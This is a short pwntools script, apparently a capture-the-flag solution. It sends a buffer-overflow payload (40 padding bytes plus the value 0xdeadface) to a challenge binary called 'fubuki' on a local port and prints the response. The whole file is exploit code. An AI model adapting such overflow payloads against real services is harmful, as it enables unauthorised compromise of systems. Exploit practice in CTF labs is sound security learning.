from pwn import *

# elf = context.binary = ELF('./fubuki')
p = remote('localhost', 31337)

payload = b'A' * 40
payload += p32(0xdeadface)

p.sendlineafter(b':', payload)
print(p.recvuntil(b'!').decode())
